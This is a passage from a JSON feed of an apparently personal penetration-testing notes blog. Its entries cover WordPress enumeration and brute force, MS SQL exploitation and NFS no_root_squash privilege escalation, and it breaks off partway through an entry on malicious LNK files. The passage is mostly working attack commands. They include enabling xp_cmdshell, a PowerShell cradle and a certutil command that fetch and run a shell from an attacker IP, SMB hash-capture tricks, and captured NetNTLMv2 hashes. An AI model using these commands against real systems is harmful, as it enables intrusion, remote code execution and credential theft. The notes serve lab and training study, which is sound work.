encoding='utf-8'?&gt;&lt;methodCall&gt;\t&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;\t&lt;params&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;\t\t\t&lt;value&gt;\t\t\t\t&lt;struct&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;name&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;type&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;bits&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;base64&gt;&lt;![CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t&lt;/struct&gt;\t\t\t&lt;/value&gt;\t\t&lt;/param&gt;\t&lt;/params&gt;&lt;/methodCall&gt;Themes  Maybe you can also find theme exploits?Plugins  You can search for plugin exploits also, one way of determining the plugin used is via html elements. Version can also be determined there.  You can also add --plugins-detection aggressive --plugins-version-detection aggressive in wpscanTroubleshoting  Sending POST to /xmlrpc.php produces 200 OK but with parse error. not well formed message most likely caused by missing php/xml parser library inside the server. I encountered this in HTB Tenten.References  Wordpress - HackTricks  HTB Tenten",
            "content_html": "<h2 id=\"version\">Version</h2><ul>  <li>On meta generators</li></ul><p><img src=\"/spindel/assets/Wordpress/3101332D-061A-4AFA-ACEA-18A476551E16.png\" alt=\"\" /></p><ul>  <li>Check interesting URL paths below</li></ul><h2 id=\"credentials\">Credentials</h2><ul>  <li>Seems you really need to find valid credentials to wordpress before exploiting</li>  <li>Try going to <code class=\"language-plaintext highlighter-rouge\">/?author=1</code> and enumerate from there to see the usernames</li>  <li>There is no default credentials. Installation will ask user to provide the creds.</li>  <li>You can guess valid usernames though</li></ul><p><img src=\"/spindel/assets/Wordpress/FCE001CA-BCC0-44B1-94FF-9B2152812FDF.png\" alt=\"\" /></p><h2 id=\"recon\">Recon</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Kickoff nmap</span>nmap <span class=\"nt\">-p80</span> <span class=\"nt\">--script</span> http-wordpress-enum,http-wordpress-users 10.10.71.200<span class=\"c\"># Using wpscan (you can remove api token but some</span><span class=\"c\"># information will not be displayed)</span><span class=\"c\"># NOTE: wpscan may not report all vulnerabilities specially</span><span class=\"c\"># on plugins</span>wpscan <span class=\"nt\">--url</span> http://10.10.10.29 <span class=\"nt\">--api-token</span> <span class=\"o\">{</span>API_TOKEN<span class=\"o\">}</span><span class=\"c\"># Similar to above but on another path</span>wpscan <span class=\"nt\">--url</span> http://10.10.10.29/wordpress <span class=\"nt\">--api-token</span> <span class=\"o\">{</span>API_TOKEN<span class=\"o\">}</span></code></pre></div></div><ul>  <li>Check for <code class=\"language-plaintext highlighter-rouge\">colorlib</code> in HTML elements. This is a WP plugin.</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># you may find version here</span>/wp-links-opml/wp-links-opml.php/readme.html<span class=\"c\"># uploads directory</span>/wp-content/uploads/YYYY/DD/FILENAME<span class=\"c\"># login</span>/wp-login.php</code></pre></div></div><h2 id=\"interesting-files\">Interesting files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># DB credentials</span>wp-config.php</code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Using nmap</span>map <span class=\"nt\">-p80</span> <span class=\"nt\">--script</span> http-wordpress-brute 10.10.10.29<span class=\"c\"># User IDs can be extracted from here. You can use</span><span class=\"c\"># burp sniper intruder and generate a list of user</span><span class=\"c\"># id from 1 to 100 using bash for loop.</span>curl <span class=\"nt\">-s</span> <span class=\"nt\">-I</span> <span class=\"nt\">-X</span> GET http://10.10.10.29/?author<span class=\"o\">=</span>1<span class=\"c\"># You can use this python script from</span><span class=\"c\"># https://github.com/relarizky/wpxploit</span><span class=\"c\"># This can take around 30 minutes to complete</span><span class=\"c\"># TIP: try using \"admin\" as username first</span><span class=\"nb\">cd</span> ~/data/tools/webapp/wpxploit./exploit.py http://10.10.127.229/wordpress 5 15<span class=\"c\"># You can also use wpscan</span>wpscan <span class=\"nt\">--url</span> http://10.10.127.229/wordpress <span class=\"nt\">--usernames</span> admin <span class=\"nt\">--passwords</span> /usr/share/wordlists/rockyou.txt</code></pre></div></div><ul>  <li>Once you have the credentials you can try uploading a PHP reverse shell</li>  <li>TIP: bruteforce is done by sending this POST data containing username and password</li></ul><div class=\"language-xml highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nt\">&lt;methodCall&gt;</span>  <span class=\"nt\">&lt;methodName&gt;</span>    wp.getUsersBlogs  <span class=\"nt\">&lt;/methodName&gt;</span>  <span class=\"nt\">&lt;params&gt;</span>    <span class=\"nt\">&lt;param&gt;</span>      <span class=\"nt\">&lt;value&gt;</span>        admin      <span class=\"nt\">&lt;/value&gt;</span>    <span class=\"nt\">&lt;/param&gt;</span>    <span class=\"nt\">&lt;param&gt;</span>      <span class=\"nt\">&lt;value&gt;</span>        gansta1      <span class=\"nt\">&lt;/value&gt;</span>    <span class=\"nt\">&lt;/param&gt;</span>  <span class=\"nt\">&lt;/params&gt;</span><span class=\"nt\">&lt;/methodCall&gt;</span></code></pre></div></div><h2 id=\"interesting-url-paths-1\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># most can be reported by wpscan</span>/wp-content/uploads//wp-admin//wp-admin/update-core.php/wp-admin/upgrade.php/install.php/wp-cron.php<span class=\"c\"># can accept post requests if active</span>/xmlrpc.php<span class=\"c\"># others</span>/plugins/wp-content/plugins</code></pre></div></div><p>For xmlrpc.php, you can use burpsuite to send some POST requests like this.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>POST /wordpress/xmlrpc.php HTTP/1.1Host: 10.10.10.29User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 95&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></pre></div></div><h2 id=\"xml-rpc-calls\">XML RPC calls</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># List all method calls</span>&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;<span class=\"c\"># Get blogs</span>&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;<span class=\"c\"># Uploading a file</span>&lt;?xml <span class=\"nv\">version</span><span class=\"o\">=</span><span class=\"s1\">'1.0'</span> <span class=\"nv\">encoding</span><span class=\"o\">=</span><span class=\"s1\">'utf-8'</span>?&gt;&lt;methodCall&gt;\t&lt;methodName&gt;wp.uploadFile&lt;/methodName&gt;\t&lt;params&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;username&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\t\t&lt;param&gt;\t\t\t&lt;value&gt;\t\t\t\t&lt;struct&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;name&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;filename.jpg&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;type&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;string&gt;mime/type&lt;/string&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t\t&lt;member&gt;\t\t\t\t\t\t&lt;name&gt;bits&lt;/name&gt;\t\t\t\t\t\t&lt;value&gt;&lt;<span class=\"nb\">base64</span><span class=\"o\">&gt;</span>&lt;<span class=\"o\">![</span>CDATA[---base64-encoded-data---]]&gt;&lt;/base64&gt;&lt;/value&gt;\t\t\t\t\t&lt;/member&gt;\t\t\t\t&lt;/struct&gt;\t\t\t&lt;/value&gt;\t\t&lt;/param&gt;\t&lt;/params&gt;&lt;/methodCall&gt;</code></pre></div></div><h2 id=\"themes\">Themes</h2><ul>  <li>Maybe you can also find theme exploits?</li></ul><p><img src=\"/spindel/assets/Wordpress/17000E5E-19E8-4681-A8D6-E9D0AA546605.png\" alt=\"\" /></p><h2 id=\"plugins\">Plugins</h2><ul>  <li>You can search for plugin exploits also, one way of determining the plugin used is via html elements. Version can also be determined there.</li></ul><p><img src=\"/spindel/assets/Wordpress/98C48061-F8E3-4613-B122-E45B3D750365.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Wordpress/0B054482-2FAF-43DA-B89C-1A847D63C7D9.png\" alt=\"\" /></p><ul>  <li>You can also add <code class=\"language-plaintext highlighter-rouge\">--plugins-detection aggressive --plugins-version-detection aggressive</code> in <code class=\"language-plaintext highlighter-rouge\">wpscan</code></li></ul><h2 id=\"troubleshoting\">Troubleshoting</h2><ul>  <li>Sending <code class=\"language-plaintext highlighter-rouge\">POST</code> to <code class=\"language-plaintext highlighter-rouge\">/xmlrpc.php</code> produces 200 OK but with <code class=\"language-plaintext highlighter-rouge\">parse error. not well formed</code> message most likely caused by <a href=\"https://github.com/maxcutler/python-wordpress-xmlrpc/issues/110\">missing php/xml parser library</a> inside the server. I encountered this in HTB Tenten.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress\">Wordpress - HackTricks</a></li>  <li>HTB Tenten</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/31/wordpress",
            
            
            
            "tags": ["web","enum","wordpress"],
            
            "date_published": "2022-01-31T00:00:00+08:00",
            "date_modified": "2022-01-31T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/30/ms-sql",
            "title": "MS SQL",
            "summary": "MS SQL",
            "content_text": "Ports  1433/tcpGathering info# Nmapnmap -p1433 --script \"*ms-sql*\" 10.10.209.245Ways of logging in# Using impacketimpacket-mssqlclient ustoun.local/svc-kerb:superman@10.10.209.245# inside windows clisqlcmd /S localhost -q \"select @@version;\"# othersmssqlclient.py -windows-auth &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;SQL Commands-- checks versionselect @@version;-- show databasesEXEC sp_databases;-- checks if use has sysadmin privileges (1 means-- sysadmin)SELECT IS_SRVROLEMEMBER('sysadmin')-- enables xp_cmdshellEXEC sp_configure 'Show Advanced Options', 1;reconfigure;sp_configure;EXEC sp_configure 'xp_cmdshell', 1reconfigure;xp_cmdshell \"whoami\"-- executes commandsxp_cmdshell \"whoami\"xp_cmdshell dir-- make victim download from our machine (10.10.14.60)xp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.60/shell.ps1\\\");\"-- Intercept NTLM hash of user (be sure to fire up-- responder first)SQL&gt; xp_dirtree '\\\\10.11.40.33\\anything'-- Transfer a reverse shell binary and execute itxp_cmdshell certutil -urlcache -f http://10.11.40.33/reverse.exe c:\\users\\SVC-Kerb.DC01\\reverse.exexp_cmdshell c:\\users\\SVC-Kerb.DC01\\reverse.exeFiles# may contain passwords, used for migration purposes*.dtsConfigOthers  OSCP personal cheatsheet",
            "content_html": "<h2 id=\"ports\">Ports</h2><ul>  <li>1433/tcp</li></ul><h2 id=\"gathering-info\">Gathering info</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nmap</span>nmap <span class=\"nt\">-p1433</span> <span class=\"nt\">--script</span> <span class=\"s2\">\"*ms-sql*\"</span> 10.10.209.245</code></pre></div></div><h2 id=\"ways-of-logging-in\">Ways of logging in</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Using impacket</span>impacket-mssqlclient ustoun.local/svc-kerb:superman@10.10.209.245<span class=\"c\"># inside windows cli</span>sqlcmd /S localhost <span class=\"nt\">-q</span> <span class=\"s2\">\"select @@version;\"</span><span class=\"c\"># others</span>mssqlclient.py <span class=\"nt\">-windows-auth</span> &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;mssqlclient.py &lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;</code></pre></div></div><h2 id=\"sql-commands\">SQL Commands</h2><div class=\"language-sql highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">-- checks version</span><span class=\"k\">select</span> <span class=\"o\">@@</span><span class=\"k\">version</span><span class=\"p\">;</span><span class=\"c1\">-- show databases</span><span class=\"k\">EXEC</span> <span class=\"n\">sp_databases</span><span class=\"p\">;</span><span class=\"c1\">-- checks if use has sysadmin privileges (1 means</span><span class=\"c1\">-- sysadmin)</span><span class=\"k\">SELECT</span> <span class=\"n\">IS_SRVROLEMEMBER</span><span class=\"p\">(</span><span class=\"s1\">'sysadmin'</span><span class=\"p\">)</span><span class=\"c1\">-- enables xp_cmdshell</span><span class=\"k\">EXEC</span> <span class=\"n\">sp_configure</span> <span class=\"s1\">'Show Advanced Options'</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">reconfigure</span><span class=\"p\">;</span><span class=\"n\">sp_configure</span><span class=\"p\">;</span><span class=\"k\">EXEC</span> <span class=\"n\">sp_configure</span> <span class=\"s1\">'xp_cmdshell'</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"n\">reconfigure</span><span class=\"p\">;</span><span class=\"n\">xp_cmdshell</span> <span class=\"nv\">\"whoami\"</span><span class=\"c1\">-- executes commands</span><span class=\"n\">xp_cmdshell</span> <span class=\"nv\">\"whoami\"</span><span class=\"n\">xp_cmdshell</span> <span class=\"n\">dir</span><span class=\"c1\">-- make victim download from our machine (10.10.14.60)</span><span class=\"n\">xp_cmdshell</span> <span class=\"nv\">\"powershell \"</span><span class=\"n\">IEX</span> <span class=\"p\">(</span><span class=\"k\">New</span><span class=\"o\">-</span><span class=\"k\">Object</span> <span class=\"n\">Net</span><span class=\"p\">.</span><span class=\"n\">WebClient</span><span class=\"p\">).</span><span class=\"n\">DownloadString</span><span class=\"p\">(</span><span class=\"err\">\\</span><span class=\"nv\">\"http://10.10.14.60/shell.ps1</span><span class=\"se\">\\\"</span><span class=\"nv\">);\"</span><span class=\"c1\">-- Intercept NTLM hash of user (be sure to fire up</span><span class=\"c1\">-- responder first)</span><span class=\"k\">SQL</span><span class=\"o\">&gt;</span> <span class=\"n\">xp_dirtree</span> <span class=\"s1\">'</span><span class=\"se\">\\\\</span><span class=\"s1\">10.11.40.33</span><span class=\"se\">\\a</span><span class=\"s1\">nything'</span><span class=\"c1\">-- Transfer a reverse shell binary and execute it</span><span class=\"n\">xp_cmdshell</span> <span class=\"n\">certutil</span> <span class=\"o\">-</span><span class=\"n\">urlcache</span> <span class=\"o\">-</span><span class=\"n\">f</span> <span class=\"n\">http</span><span class=\"p\">:</span><span class=\"o\">//</span><span class=\"mi\">10</span><span class=\"p\">.</span><span class=\"mi\">11</span><span class=\"p\">.</span><span class=\"mi\">40</span><span class=\"p\">.</span><span class=\"mi\">33</span><span class=\"o\">/</span><span class=\"n\">reverse</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"k\">c</span><span class=\"p\">:</span><span class=\"err\">\\</span><span class=\"n\">users</span><span class=\"err\">\\</span><span class=\"n\">SVC</span><span class=\"o\">-</span><span class=\"n\">Kerb</span><span class=\"p\">.</span><span class=\"n\">DC01</span><span class=\"err\">\\</span><span class=\"n\">reverse</span><span class=\"p\">.</span><span class=\"n\">exe</span><span class=\"n\">xp_cmdshell</span> <span class=\"k\">c</span><span class=\"p\">:</span><span class=\"err\">\\</span><span class=\"n\">users</span><span class=\"err\">\\</span><span class=\"n\">SVC</span><span class=\"o\">-</span><span class=\"n\">Kerb</span><span class=\"p\">.</span><span class=\"n\">DC01</span><span class=\"err\">\\</span><span class=\"n\">reverse</span><span class=\"p\">.</span><span class=\"n\">exe</span></code></pre></div></div><h2 id=\"files\">Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># may contain passwords, used for migration purposes</span><span class=\"k\">*</span>.dtsConfig</code></pre></div></div><h2 id=\"others\">Others</h2><ul>  <li><a href=\"https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html#mssql---1433\">OSCP personal cheatsheet</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/01/30/ms-sql",
            
            
            
            "tags": ["db","enum"],
            
            "date_published": "2022-01-30T00:00:00+08:00",
            "date_modified": "2022-01-30T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash",
            "title": "NFS no_root_squash",
            "summary": "NFS no_root_squash",
            "content_text": "OverviewIf an NFS export contains no_root_squash option, attacker can mount that export on his machine and modify any file acting as root user.Steps  Mount share on attacker machine  Inside victim machine, copy /bin/bash# e.g /home/james is an NFS exportcd /home/jamescp /bin/bash .  From attacker machinecd /mntsudo chown root:root bashsudo chmod u+s bash  Back to victim machine,./bash -p# enjoy!",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>If an NFS export contains <code class=\"language-plaintext highlighter-rouge\">no_root_squash</code> option, attacker can mount that export on his machine and modify any file acting as root user.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Mount share on attacker machine</li>  <li>Inside victim machine, copy <code class=\"language-plaintext highlighter-rouge\">/bin/bash</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># e.g /home/james is an NFS export</span><span class=\"nb\">cd</span> /home/james<span class=\"nb\">cp</span> /bin/bash <span class=\"nb\">.</span></code></pre></div></div><ul>  <li>From attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> /mnt<span class=\"nb\">sudo chown </span>root:root bash<span class=\"nb\">sudo chmod </span>u+s bash</code></pre></div></div><ul>  <li>Back to victim machine,</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./bash <span class=\"nt\">-p</span><span class=\"c\"># enjoy!</span></code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash",
            
            
            
            "tags": ["linux","privesc","nfs"],
            
            "date_published": "2022-01-29T00:00:00+08:00",
            "date_modified": "2022-01-29T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/24/zipped-lnk-files-over-smb",
            "title": "Zipped LNK files over SMB",
            "summary": "Zipped LNK files over SMB",
            "content_text": "OverviewAttackers can upload a .zip file containing .lnk file to a smb share. The .link file can contain malicuous code such as connecting back to attacker’s own evil smb share.Once a victim unzips that file, attacker can intercept the user’s hash.Requirements  SMB share on victim machine that attacker has accessSteps  Downlod mslink. You will use that to create a malicuous link file.  Create a malicuous link file that will connect to your own evil share.~/data/tools/mslink_v1.3.sh -l whatever -n hook -i \\\\\\\\10.11.40.33\\\\share -o hook.lnk  Compress it.zip hook.zip hook.lnk  Create an SMB share on your attacker machineimpacket-smbserver -smb2support share .  Upload the zip file to the SMB share of victim machine.smb: \\&gt; put hook.zip  Sit back and enjoyImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsed[*] Incoming connection (10.10.147.136,50222)[*] AUTHENTICATE_MESSAGE (SET\\MichelleWat,SET)[*] User SET\\MichelleWat authenticated successfully[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:ca86a1caeea26a1753bd2092bb6bb76a:010100000000000080132f632685d701fdefe7ef95805d14000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080080132f632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000[*] Closing down connection (10.10.147.136,50222)[*] Remaining connections [][*] Incoming connection (10.10.147.136,50223)[*] AUTHENTICATE_MESSAGE (SET\\MichelleWat,SET)[*] User SET\\MichelleWat authenticated successfully[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:3b1d30ff9e5129ad225cc8129e3a9fa5:010100000000000000aac7632685d701b14749bbc7f0a2db000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080000aac7632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000[*] Closing down connection (10.10.147.136,50223)[*] Remaining connections [][*] Incoming connection (10.10.147.136,50224)[*] AUTHENTICATE_MESSAGE (SET\\MichelleWat,SET)[*] User SET\\MichelleWat authenticated successfully[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:39d0e73f4909f98a02f8be457e765a0f:0101000000000000804060642685d701cefc2fd6b5e9dc17000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b0007000800804060642685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000[*] Closing down connection (10.10.147.136,50224)[*] Remaining connections []  You will be able to capture the NLMv2 hashes. You can now use hashcat to crack it.Other InfoHere is the script that process the zip files inside smb share.@echo offSET source=\"C:\\Shares\\Files\"SET extracted=\"C:\\Shares\\extracted\"powershell.exe -NoP -NonI -Command \"Expand-Archive '%source%\\*.zip' '%extracted%'\"FOR /f \"tokens=*\" %%G IN ('dir /s /b %extracted%\\..\\*.') DO (explorer %%G)\tping -n 3 127.1&gt;NULtaskkill /IM explorer.exermdir %extracted% /q /sdel %source%\\*.zip -jReferences  How Attackers are Using LNK Files to Download Malware",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attackers can upload a <code class=\"language-plaintext highlighter-rouge\">.zip</code> file containing <code class=\"language-plaintext highlighter-rouge\">.lnk</code> file to a smb share. The <code class=\"language-plaintext highlighter-rouge\">.link</code> file can contain malicuous code such as connecting back to attacker’s own evil smb share.</p><p>Once a victim unzips that file, attacker can intercept the user’s hash.</p><h2 id=\"requirements\">Requirements</h2><ul>  <li>SMB share on victim machine that attacker has access</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Downlod <a href=\"http://www.mamachine.org/mslink/index.en.html\">mslink</a>. You will use that to create a malicuous link file.</li>  <li>Create a malicuous link file that will connect to your own evil share.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>~/data/tools/mslink_v1.3.sh <span class=\"nt\">-l</span> whatever <span class=\"nt\">-n</span> hook <span class=\"nt\">-i</span> <span class=\"se\">\\\\\\\\</span>10.11.40.33<span class=\"se\">\\\\</span>share <span class=\"nt\">-o</span> hook.lnk</code></pre></div></div><ul>  <li>Compress it.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>zip hook.zip hook.lnk</code></pre></div></div><ul>  <li>Create an SMB share on your attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>impacket-smbserver <span class=\"nt\">-smb2support</span> share <span class=\"nb\">.</span></code></pre></div></div><ul>  <li>Upload the zip file to the SMB share of victim machine.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>smb: \\&gt; put hook.zip</code></pre></div></div><ul>  <li>Sit back and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Callback added <span class=\"k\">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Callback added <span class=\"k\">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Config file parsed<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Incoming connection <span class=\"o\">(</span>10.10.147.136,50222<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> AUTHENTICATE_MESSAGE <span class=\"o\">(</span>SET<span class=\"se\">\\M</span>ichelleWat,SET<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> User SET<span class=\"se\">\\M</span>ichelleWat authenticated successfully<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> MichelleWat::SET:aaaaaaaaaaaaaaaa:ca86a1caeea26a1753bd2092bb6bb76a:010100000000000080132f632685d701fdefe7ef95805d14000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080080132f632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Closing down connection <span class=\"o\">(</span>10.10.147.136,50222<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Remaining connections <span class=\"o\">[]</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Incoming connection <span class=\"o\">(</span>10.10.147.136,50223<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> AUTHENTICATE_MESSAGE <span class=\"o\">(</span>SET<span class=\"se\">\\M</span>ichelleWat,SET<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> User SET<span class=\"se\">\\M</span>ichelleWat authenticated successfully<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> MichelleWat::SET:aaaaaaaaaaaaaaaa:3b1d30ff9e5129ad225cc8129e3a9fa5:010100000000000000aac7632685d701b14749bbc7f0a2db000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080000aac7632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Closing down connection <span class=\"o\">(</span>10.10.147.136,50223<span class=\"o\">)</span><span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> Remaining connections <span 